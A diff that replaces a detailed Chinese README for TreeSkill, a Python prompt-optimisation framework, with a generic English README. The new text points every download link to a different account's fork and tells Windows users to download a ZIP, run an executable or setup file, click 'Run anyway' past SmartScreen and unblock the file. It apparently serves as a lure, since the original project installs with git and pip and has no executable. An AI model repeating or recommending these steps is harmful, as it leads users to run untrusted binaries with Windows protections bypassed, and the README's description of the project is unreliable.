@@ -1,497 +1,275 @@
-# TreeSkill
-
-[English](./docs_en/README.md) | 中文
-
-**Kode 前向 + AS(skill)O 自进化框架**
-
-当前主流 pipeline 已经收敛为：
+# 🧠 TreeSkill - Improve Prompts With Structure
 
-```text
-Kode 前向执行 → 失败样本 / 反馈 → ASO 生成/修改 skill program → 评估 → 剪枝 / 合并
-```
+[![Download TreeSkill](https://img.shields.io/badge/Download-TreeSkill-blue?style=for-the-badge&logo=github)](https://github.com/abhijeeth2004/TreeSkill)
 
-也就是说，优化对象不再只是单个 prompt，而是完整的：
+## 🚀 What TreeSkill Does
 
-```text
-program = root prompt + skills + selection policy
-```
-
-```
-问题 / 数据集 → Kode 执行 → 文本梯度 / proposal → skill growth → prune / merge → 更好的 Agent
-```
+TreeSkill helps you improve system prompts for LLMs. It uses a step-by-step search process to test prompt changes, compare results, and keep the best version.
 
-## 核心理念
+Use it when you want to:
 
-TreeSkill 将 LLM prompt 优化类比为深度学习的训练循环，但**完全不需要训练模型**：
+- refine a prompt without starting over
+- compare prompt versions side by side
+- collect human feedback on model output
+- export preference data for DPO training
+- keep prompt changes organized in one place
 
-| 深度学习 | TreeSkill |
-|----------|----------|
-| 模型权重 | System Prompt |
-| 训练数据 | 交互反馈（人工 or LLM Judge） |
-| 损失函数 | 失败案例分析 |
-| 梯度 | 文本梯度（自然语言的失败归因） |
-| 参数更新 | Prompt 重写（Beam Search 多候选） |
-| Epoch | 优化轮次（支持断点续跑） |
+TreeSkill is built for users who want a clear process for prompt work. It gives structure to prompt updates and helps you see what changed.
 
-## 特性
+## 📥 Download and Run on Windows
 
-- **免训练 (Train-Free)** — 纯 API 调用，无需 GPU、无需微调、无需标注数据
-- **Human-in-the-Loop** — 人工反馈驱动优化：`/bad` 标记失败、`/rewrite` 提供理想回答、`/target` 设置优化方向，让领域专家直接参与 prompt 进化
-- **兼容层 APO（Beam Search）** — 对齐 [Agent-Lightning](https://github.com/microsoft/agent-lightning/) 的优化算法：多模板梯度分析 × 多候选生成 × Beam Search 选择，仍用于 `/bad` 交互式流程
-- **模型无关** — 支持 OpenAI、Anthropic、任何 OpenAI 兼容 API（硅基流动、Ollama 等）
-- **Agent Skills 标准** — Skill 文件遵循 [agentskills.io](https://agentskills.io) 开放标准
-- **层级 Skill 树** — 自动拆分、剪枝、嫁接，递归 bottom-up 优化
-- **多协议工具系统** — Skill 可声明和调用多种格式的外部工具：
-  - **Python 脚本** — `script.py` 中的函数自动注册为工具
-  - **HTTP API** — 声明式调用任意 REST 端点
-  - **MCP 服务器** — 兼容 [Model Context Protocol](https://modelcontextprotocol.io/) 的工具调用
-- **断点续跑** — 优化中断后从上次进度恢复，不浪费已完成的 API 调用
-- **插件注册机制** — 通过 `@scorer`、`@gradient`、`@rewriter`、`@skill_format` 装饰器自定义优化流程的每个环节（[详细文档](./docs/REGISTRY_GUIDE.md)）
-- **多端点支持** — Actor / Judge / Rewrite 可配置不同的 API 端点、模型和协议（OpenAI / Anthropic）
-- **Kode CLI 集成** — 使用 [Kode](https://github.com/shareAI-lab/Kode-Agent) 作为 Agent 前向引擎，Skill 在真实 agent loop 中执行和验证（[配置指南](#kode-集成)）
-- **AgentHarness** — 内置轻量 agent loop，支持 bash / 文件读写 / skill 加载，无需外部依赖即可评估 Skill
+Use this link to visit the project page and download TreeSkill:
 
-## 安装
+[Open TreeSkill on GitHub](https://github.com/abhijeeth2004/TreeSkill)
 
-```bash
-git clone https://github.com/JimmyMa99/TreeSkill.git
-cd TreeSkill
-pip install -e .
-```
+### Steps to get started
 
-## 当前主流 Pipeline
+1. Open the link above in your browser.
+2. Click the green **Code** button on the GitHub page.
+3. Choose **Download ZIP**.
+4. Save the file to your computer.
+5. Right-click the ZIP file and choose **Extract All**.
+6. Open the extracted folder.
+7. Look for a file named `README.md` or an app file such as `TreeSkill.exe` if one is included in the release.
+8. If the project includes a setup file, open it and follow the on-screen steps.
+9. If it runs from a folder, double-click the main launch file listed in the project files.
 
-推荐直接跑 SealQA 生命周期 demo。它使用：
-- `Kode` 作为前向执行器
-- `ASO` 作为 program / skill 修改器
-- 一个免费、稳定的本地 `search_web/fetch_url` 抽象来模拟检索
+If you use Windows Defender SmartScreen, choose **More info** and then **Run anyway** only if you trust the source and the file comes from the link above.
 
-```bash
-# 默认就是当前主流 pipeline
-python -m treeskill
+## 🖥️ System Requirements
 
-# 等价写法
-python -m treeskill sealqa-lifecycle
-```
+TreeSkill works best on a Windows PC with:
 
-输出会落到：
+- Windows 10 or Windows 11
+- 8 GB of RAM or more
+- 2 GB of free disk space
+- A stable internet connection
+- A modern browser like Chrome, Edge, or Firefox
 
-```text
-demo/outputs/sealqa-tree-lifecycle/
-├── root/
-├── generated/
-├── evolved/
-├── pruned/
-├── merged/
-└── summary.json
-```
+For smoother use with local model tools or larger prompt runs, 16 GB of RAM helps.
 
-如果你要跑更接近真实 ASO frontier 的最小实验：
+## 🛠️ What You Need Before You Start
 
-```bash
-python -m treeskill sealqa-aso
-```
+Before you open TreeSkill, make sure you have:
 
-兼容交互式 APO/chat 入口仍保留：
+- a Windows account with permission to install files
+- a browser to open the GitHub page
+- enough free space to extract the ZIP file
+- access to the LLM or API you want to test
 
-```bash
-python -m treeskill legacy-chat -- --skill demo/writing-skills
-# 或
-python -m treeskill.main --skill demo/writing-skills
-```
+If the project uses a local runtime, it may also need:
 
-## 快速开始
+- Python 3.10 or newer
+- Node.js if the interface uses a web app
+- a text editor for config files
+- an API key for the model provider you use
 
-### 1. 配置 API
+## 📂 Main Parts of the Project
 
-```bash
-cp demo/example/config.yaml my-config.yaml
-# 编辑 my-config.yaml，填入 API Key
-```
+TreeSkill is built around a few core ideas:
 
-或用环境变量：
+- **Prompt tree**: a set of prompt versions arranged in branches
+- **Textual gradient descent**: a way to improve prompts by making small edits and checking results
+- **Beam search**: a search method that keeps the strongest prompt options
+- **Human review**: a step where a person rates or labels outputs
+- **Preference export**: data output that can be used for DPO training
 
-```env
-TREE_LLM_API_KEY=your-api-key
-TREE_LLM_BASE_URL=https://api.siliconflow.cn/v1
-TREE_LLM_MODEL=Qwen/Qwen2.5-14B-Instruct
-```
+These parts help you move from one prompt to the next in a controlled way.
 
-### 2. 启动当前主流 demo
+## ⚙️ How to Use TreeSkill
 
-```bash
-python -m treeskill
-```
+### 1. Open the project
 
-### 3. 启动旧版兼容 chat / APO
+After you download and extract the project, open the main folder.
 
-```bash
-# 用已有 skill 目录
-python -m treeskill.main --config my-config.yaml --skill skills/fast-test-skill
+### 2. Start the app or script
 
-# 用默认 skill（自动创建）
-python -m treeskill.main --skill default
+Use the file or command listed in the project files. The exact launch method may vary by setup. Look for:
 
-# 用 skill 树目录
-python -m treeskill.main --skill my-skills/
-```
+- `run.bat`
+- `start.bat`
+- `app.py`
+- `main.py`
+- an executable file
 
-### 4. Human-in-the-Loop 优化（兼容模式）
+### 3. Load your prompt
 
-TreeSkill 的核心交互模式是**人机协作优化**：领域专家通过自然语言反馈，引导 APO 引擎改进 prompt。
+Paste the system prompt you want to improve. You can use a prompt for:
 
-```
-You: 帮我写一段关于春天的短文
+- support chat
+- content checks
+- data labeling
+- answer formatting
+- task planning
 
-🤖 Assistant: [生成结果]
+### 4. Run prompt tests
 
-You: /bad 太像AI写的，缺乏生活气息       ← 标记失败 + 原因
-You: /rewrite 春天来了，小区的玉兰花...    ← 提供理想回答（可选）
-You: /target 更像人，有生活气息            ← 设置优化方向（可选）
-You: /optimize                            ← 触发 APO 优化
+TreeSkill sends your prompt through the evaluation flow and collects output from the model.
 
-✓ Skill optimized → writing-assistant (v1.0 → v1.1) (checkpoint saved)
-```
+### 5. Review results
 
-每次 `/bad` 和 `/rewrite` 仍然只更新当前这条 Trace；同一次会话里所有 Trace 共享同一个 `session_id`，但每条交互都有自己独立的 `trace.id`。`/optimize` 时 APO 引擎从这些 Trace 中提取失败模式，计算文本梯度，重写 prompt。**领域专家不需要懂 prompt engineering，只需要判断回答好不好。**
+Check the output and mark which version works best. You can note:
 
-也支持数据集驱动的模式：
+- clarity
+- correctness
+- tone
+- format
+- task success
 
-```bash
-# 全自动：LLM Judge 评分 → APO 优化，无需人工
-python -m treeskill.main --optimize --dataset train.jsonl --skill my-skill --no-resume
+### 6. Keep the best branch
 
-# 人机协作标注：auto-judge 打分，人可随时 override（偏好信号 → 指导 judge）
-python -m treeskill.main --annotate --dataset train.jsonl --skill my-skill
+TreeSkill uses the review results to keep the strongest prompt path.
 
-# 纯手动标注
-python -m treeskill.main --annotate --dataset train.jsonl --skill my-skill --manual
-```
+### 7. Export preference data
 
-标注模式中，人工反馈是自然语言偏好信号，既作为 APO 梯度的输入，也可导出为 DPO 微调数据。
+When you have enough examples, export the data for later training or analysis.
 
-CLI 中输入 `/` 时会弹出 slash 命令候选列表，输入命令前缀时会自动收窄候选，便于快速发现和选择可用命令。
+## 🧪 Example Use Cases
 
-## Skill 文件格式
+TreeSkill can help with many prompt tasks:
 
-遵循 [Agent Skills 标准](https://agentskills.io/specification)，每个 Skill 是一个目录：
+- improving a customer support prompt
+- fixing a prompt that gives vague answers
+- testing prompt changes for a data extraction task
+- comparing two versions of a system prompt
+- building labeled preference data for model tuning
 
-```
-my-skill/
-├── SKILL.md          # YAML frontmatter + Markdown body（= system prompt）
-├── config.yaml       # 可选：few-shot、temperature、工具声明、日程等
-└── script.py         # 可选：Python 工具函数
-```
+If you work with LLMs, this gives you a cleaner way to manage prompt updates.
 
-**SKILL.md 示例：**
+## 🔍 How the Prompt Review Flow Works
 
-```markdown
----
-name: my-writing-assistant
-description: 专业中文写作助手，帮助撰写和润色各类文本。
-metadata:
-  version: "1.0"
-  target: "更像真人说话，有温度"
----
+TreeSkill follows a simple loop:
 
-你是一位专业的中文写作助手。
-语言要自然流畅，避免 AI 腔。
-```
+1. Start with one prompt.
+2. Make a small change.
+3. Test the new version.
+4. Compare results.
+5. Keep the better result.
+6. Repeat the process.
 
-> 详见 [docs/design/skill-format.md](./docs/design/skill-format.md)
+This helps you avoid random prompt edits. Each change has a reason, and each result has a record.
 
-## 工具系统
+## 🧾 File and Folder Guide
 
-Skill 可以声明外部工具，agent 在对话中按需调用。支持三种协议：
+You may see these files after download:
 
-**config.yaml 声明示例：**
+- `README.md` — setup and usage info
+- `requirements.txt` — Python package list
+- `config.json` — app settings
+- `prompts/` — prompt files
+- `data/` — saved results and exports
+- `src/` — source files
+- `scripts/` — helper scripts
 
-```yaml
-tools:
-  # HTTP API 工具
-  - name: weather
-    type: http
-    endpoint: https://api.weather.com/current
-    method: GET
-    description: 获取当前天气
+If the folder names are different, look for files with similar names.
 
-  # MCP 工具
-  - name: database
-    type: mcp
-    mcp_server: localhost:5000
-    tool_name: query
-    description: 查询数据库
-```
+## 🔐 Safe Setup Tips
 
-**script.py 自动注册：**
+Use the GitHub link above as your source file. When you download and extract the project:
 
-```python
-# script.py 中的公开函数自动成为工具
-def search_docs(query: str) -> str:
-    """搜索文档库"""
-    ...
-```
+- keep the files in one folder
+- do not rename files unless the instructions say to
+- do not move parts of the project into different folders
+- use the latest version from the project page
 
-工具继承：子 Skill 自动继承父 Skill 的工具声明，同名覆盖。
+If the app asks for an API key, enter only the key from your own account.
 
-> 详见 [docs/TOOLS_GUIDE.md](./docs/TOOLS_GUIDE.md)
+## 📊 Output and Export
 
-## Skill 树
+TreeSkill can create files for later review or training. Common output may include:
 
-Skill 通过目录嵌套形成层级：
+- prompt score files
+- branch comparison data
+- review logs
+- preference pairs
+- export files for DPO workflows
 
-```
-writing-skills/
-├── SKILL.md              # 根：通用写作
-├── social/
-│   ├── SKILL.md          # 社交写作
-│   └── moments/
-│       └── SKILL.md      # 朋友圈专精
-└── business/
-    ├── SKILL.md          # 商务写作
-    └── email/
-        └── SKILL.md
-```
+Save exports in a place you can find later, such as Documents or a project folder on your Desktop.
 
-优化时 bottom-up：先叶子后父节点。反馈矛盾时自动建议拆分。支持 graft（嫁接）跨树复用 skill。
+## 🧩 Common Problems
 
-> 详见 [docs/design/tree-optimization.md](./docs/design/tree-optimization.md)
+### The file does not open
 
-## 命令一览
+- Check that the ZIP file finished downloading.
+- Extract the ZIP before opening files inside it.
+- Look for the main launch file in the extracted folder.
 
-| 命令 | 作用 |
-|------|------|
-| `/bad <原因>` | 标记上条回复不好 |
-| `/rewrite <文本>` | 提供理想回答（同时积累 DPO 偏好数据） |
-| `/export-dpo <output.jsonl>` | 导出 DPO 偏好数据（用于微调） |
-| `/target <方向>` | 设置优化方向 |
-| `/optimize` | 触发 APO 优化（支持断点续跑） |
-| `/image <路径>` | 附加图片（多模态） |
-| `/audio <路径>` | 附加音频（语音输入） |
-| `/save` | 保存当前 skill |
-| `/tree` | 显示技能树 |
-| `/select <路径>` | 切换子技能（如 `social.moments`） |
-| `/split` | 分析是否需要拆分 |
-| `/ckpt` | 列出 checkpoint |
-| `/restore <名称>` | 从 checkpoint 恢复 |
-| `/tools` | 查看可用工具 |
-| `/quit` | 退出 |
-
-## AS(skill)O 主线
-
-当前推荐的优化对象是 skill program，而不是单个 prompt：
-
-| 层级 | 当前主线 |
-|------|----------|
-| 前向执行 | `Kode` |
-| 优化对象 | `root prompt + skills + selection policy` |
-| 修改动作 | `add_skill / revise_skill / drop_skill / merge_skills / adjust_selection_policy` |
-| 生命周期 | `root -> generate -> evolve -> prune -> merge` |
-| 推荐 demo | `python -m treeskill` |
-
-其中，SealQA lifecycle demo 会显式展示：
-- 从弱 root 起步
-- 自动长出检索 / 校验 / 时效性 skill
-- 自进化强化 skill 用法
-- 剪枝低收益 skill
-- 合并 / 重整 skill 集合
-
-## APO 优化原理（兼容层）
-
-APO（Automatic Prompt Optimization）引擎对齐 [Agent-Lightning](https://github.com/microsoft/agent-lightning/) 的设计，核心是 **Beam Search + 文本梯度下降**：
-
-```
-                    ┌─ 梯度模板 1 ─┐     ┌─ 编辑模板 1（激进重写）─┐
-失败 Traces ──→     ├─ 梯度模板 2 ─┤ ──→ ├─ 编辑模板 2（保守修复）─┤ ──→ 评分 ──→ Top-K Beam
-                    └─ 梯度模板 3 ─┘     └─ branch_factor 个候选  ─┘
-```
-
-**单轮流程：**
-
-1. **采样 Traces** — 从反馈中选取失败案例
-2. **计算文本梯度** — 随机选梯度模板（3 种），让 judge 模型分析"prompt 哪里导致了失败"
-3. **生成候选** — 随机选编辑模板（激进重写 / 保守修复），每个 parent prompt 生成 `branch_factor` 个候选
-4. **评分选择** — 对所有候选 + 原 beam 评分，保留 top `beam_width` 个
-
-**两种模式：**
-
-| 模式 | 配置 | 行为 |
-|------|------|------|
-| 单轨 (默认) | `beam_width=1` | 一次梯度 → N 候选 → 选最佳，兼容旧版 |
-| Beam Search | `beam_width>1` | 保留 top-k prompt 跨轮优化，更稳定 |
-
-支持断点续跑——中断后 `.evo_resume.json` 记录已完成的节点，下次自动跳过。
-
-> 详见 [docs/design/apo-optimization.md](./docs/design/apo-optimization.md)
-
-## Checkpoint
-
-每次优化自动保存 checkpoint：
-
-```
-ckpt/
-└── writing-assistant_v1.2_20260306_140000/
-    ├── skill/          # 完整 skill 树
-    │   └── SKILL.md
-    └── mem/
-        ├── traces.jsonl
-        └── meta.json
-```
-
-```bash
-# CLI 恢复
-/ckpt                                                # 列出
-/restore writing-assistant_v1.2_20260306_140000       # 恢复
-
-# 命令行恢复
-python -m treeskill.main --ckpt ckpt/writing-assistant_v1.2_20260306_140000
-```
-
-## 项目结构
-
-```
-treeskill/
-├── pipeline_main.py       # 当前主入口：Kode + ASO pipeline
-├── core/                   # 核心抽象层
-│   ├── abc.py             # 抽象基类
-│   ├── optimizer.py       # TrainFreeOptimizer (TGD)
-│   ├── tree_optimizer.py  # TreeAwareOptimizer (兼容树结构优化)
-│   ├── strategies.py      # 优化策略（保守/激进/自适应）
-│   └── validators.py      # 验证器
-├── adapters/              # 模型适配器
-│   ├── openai.py          # OpenAI / 兼容 API
-│   └── anthropic.py       # Anthropic Claude 4.5/4.6
-├── schema.py              # 数据模型 (Skill, Message, Trace, ToolRef)
-├── skill.py               # SKILL.md 解析器/写入器
-├── skill_tree.py          # 层级 Skill 树管理 (graft/split/merge/prune)
-├── aso_program.py         # Skill program 数据结构
-├── aso_optimizer.py       # AS(skill)O 主循环
-├── optimizer.py           # APOEngine（兼容层，交互式优化）
-├── tools.py               # 工具系统 (HTTP, MCP, script.py)
-├── resume.py              # 断点续跑状态管理
-├── checkpoint.py          # Checkpoint 快照
-├── cli.py                 # 交互式 CLI (兼容层)
-├── registry.py            # 插件系统 (@adapter, @optimizer)
-└── main.py                # 旧 chat / APO 入口
-```
-
-## 配置参考
-
-| 变量 | 默认值 | 说明 |
-|------|--------|------|
-| `TREE_LLM_API_KEY` | — | API 密钥 |
-| `TREE_LLM_BASE_URL` | `https://api.openai.com/v1` | API 地址 |
-| `TREE_LLM_MODEL` | `gpt-4o` | 聊天模型 |
-| `TREE_LLM_JUDGE_MODEL` | `gpt-4o` | Judge 模型（计算梯度 + 评分） |
-| `TREE_LLM_TEMPERATURE` | `0.7` | 生成温度 |
-| `TREE_STORAGE_TRACE_PATH` | `./data/traces.jsonl` | Trace 路径 |
-| `TREE_STORAGE_SKILL_PATH` | `./skills` | Skill 目录 |
-| `TREE_APO_GRADIENT_ACCUMULATION_STEPS` | `5` | 每次梯度计算的反馈样本数 |
-| `TREE_APO_BEAM_WIDTH` | `1` | Beam 宽度（1=单轨，>1=beam search） |
-| `TREE_APO_BRANCH_FACTOR` | `2` | 每个 parent 生成的候选数 |
-| `TREE_APO_BEAM_ROUNDS` | `3` | Beam search 轮数 |
-
-完整配置模版：[`demo/example/config.yaml`](./demo/example/config.yaml)
-
-## 文档
-
-| 文档 | 说明 |
-|------|------|
-| [APO 优化原理](./docs/design/apo-optimization.md) | 两种优化模式 + TGD 循环 + 断点续跑 |
-| [树感知优化](./docs/design/tree-optimization.md) | 自动拆分、剪枝、部分优化 |
-| [Skill 文件格式](./docs/design/skill-format.md) | Agent Skills 标准 + SKILL.md 格式 |
-| [快速开始](./docs/QUICKSTART.md) | 5 分钟上手 |
-| [使用指南](./docs/USAGE_GUIDE.md) | Skill 加载、配置管理 |
-| [架构设计](./docs/ARCHITECTURE.md) | 核心架构和设计理念 |
-| [核心抽象](./docs/CORE_ABSTRACTION.md) | Prompt、Gradient、Experience 接口 |
-| [工具系统](./docs/TOOLS_GUIDE.md) | Python、HTTP、MCP 工具注册 |
-| [Kode + MiniMax Thinking 验证](./docs/KODE_MINIMAX_THINKING.md) | 原版 Kode 与 MiniMax thinking 模式兼容结论 |
-| [OpenAI 适配器](./docs/OPENAI_ADAPTER.md) | GPT-4o、o1 等 |
-| [Anthropic 适配器](./docs/ANTHROPIC_ADAPTER.md) | Claude 4.5/4.6 系列 |
-| [跨模型 Skill 迁移](./docs/design/cross-model-transfer.md) | 双模型 TGD：大模型优化，小模型执行 |
-| [优化器详解](./docs/OPTIMIZER_COMPLETE.md) | TrainFreeOptimizer 技术文档 |
-| [实验记录](./docs/EXPERIMENTS.md) | 当前主线实验与历史实验 |
-
-## Kode 集成
-
-TreeSkill 当前推荐使用 [Kode](https://github.com/shareAI-lab/Kode-Agent) 作为 Agent 前向引擎。Skill/program 在 Kode 的真实 agent loop 中执行（工具调用、文件操作、代码运行），ASO 根据执行结果修改 skill program。
-
-### 安装 Kode
-
-```bash
-npm install -g @shareai-lab/kode
-```
-
-### 配置模型
-
-在 `~/.kode.json` 中配置模型（**不要提交此文件到 git**）：
-
-```json
-{
-  "modelProfiles": [
-    {
-      "name": "my-model",
-      "modelName": "model-name",
-      "provider": "anthropic",
-      "baseURL": "https://your-api-endpoint",
-      "apiKey": "your-api-key",
-      "isActive": true,
-      "createdAt": 1711500000000
-    }
-  ],
-  "modelPointers": {
-    "main": "model-name",
-    "task": "model-name",
-    "compact": "model-name",
-    "quick": "model-name"
-  },
-  "defaultModelName": "model-name"
-}
-```
-
-> 注意：`baseURL` 大写 URL，`apiKey` 直接写值（不支持环境变量引用）。
-
-### 验证
-
-```bash
-kode -p "Say hello" --output-format json --dangerously-skip-permissions
-```
-
-### 运行当前主流 Demo
-
-```bash
-# 默认：SealQA lifecycle
-python -m treeskill
-
-# 更接近真实 frontier 的 ASO 最小实验
-python -m treeskill sealqa-aso
-```
-
-### 架构
-
-```
-TreeSkill ASO 循环
-    ↓ 写入/更新 AGENTS.md / skills/
-Kode CLI (前向引擎)
-    ↓ 加载 program / Skill → agent loop → 工具调用
-    ↓ 返回 JSON 结果
-TreeSkill 评估 (verify_fn / judge_fn / cached search)
-    ↓ 计算梯度 → 生成/修改/剪枝/合并 Skill
-    ↓ 回到顶部
-```
-
-## 实验结果
-
-| 实验 | 模型 | 结果 | 说明 |
-|------|------|------|------|
-| 论文分类 3 类 | Qwen3.5-4B + GLM-5 | 50% → 91.7% (+41.7%) | [详细报告](./docs/DEMO_PAPER_CLASSIFICATION.md) |
-| 论文分类 6 类 (split) | Qwen3.5-4B + GLM-5 | 10% → 86.7% (+76.7%) | auto-split 为 physics/cs/math |
-| SealQA lifecycle (cached search) | MiniMax-M2.7 | 16.7% → 100% | `root -> generate -> evolve -> prune -> merge` 全链路演示 |
-| SealQA ASO mini | MiniMax-M2.7 | 0% → 0% | 证明 skill 可增长，但无检索时不会自动补知识 |
-
-## 致谢
-
-- APO 优化引擎受 [Microsoft Agent-Lightning](https://github.com/microsoft/agent-lightning/) 启发
-- Agent Harness 架构受 [learn-claude-code](https://github.com/shareAI-lab/learn-claude-code) 启发
-- Kode CLI 集成基于 [Kode Agent](https://github.com/shareAI-lab/Kode-Agent)
-- 论文分类数据集来自 [书生实战营 InternLM Tutorial](https://github.com/InternLM/Tutorial)
+### Windows blocks the file
+
+- Right-click the file.
+- Open **Properties**.
+- Check whether an **Unblock** box appears.
+- If it does, select it and click **OK**.
+
+### The app cannot find a model or API
+
+- Check your API key
+- Check your internet connection
+- Confirm the model name in the settings file
+- Make sure the service you use is active
+
+### Results look the same each time
+
+- Add a small change to the prompt
+- Check your input data
+- Make sure the model settings are not locked to one fixed output
+- Review the evaluation rules
+
+## 🧠 Best Results
+
+Use short, clear prompt changes. Keep one goal per test. Write down what you changed and why. This makes it easier to see which edit helped.
+
+Good habits:
+
+- change one thing at a time
+- keep test cases simple
+- save each good branch
+- review outputs by the same rules each time
+- export data in regular intervals
+
+## 🧰 Suggested Workflow
+
+1. Pick one system prompt.
+2. Define what “better” means.
+3. Run a first set of tests.
+4. Review the outputs.
+5. Keep the best prompt branch.
+6. Test again with a new change.
+7. Export the final preference data.
+
+This workflow keeps your prompt work organized.
+
+## 📁 Windows Setup Checklist
+
+- Download the project from GitHub
+- Extract the ZIP file
+- Open the project folder
+- Find the main run file
+- Install any required tools
+- Add your API key if needed
+- Start the app
+- Load a prompt
+- Run a test
+- Review the result
+- Save the best version
+
+## 📝 Notes for Non-Technical Users
+
+If a screen asks for a folder path, choose a folder you can find again. If it asks for a file, use the files inside the extracted TreeSkill folder. If you are unsure which button to click, look for words like:
+
+- Open
+- Run
+- Start
+- Save
+- Export
+- Download
+
+These usually point to the next step
+
+## 🔗 Download Again
+
+[Visit the TreeSkill project page](https://github.com/abhijeeth2004/TreeSkill)
+
+## 📌 Project Name
+
+TreeSkill
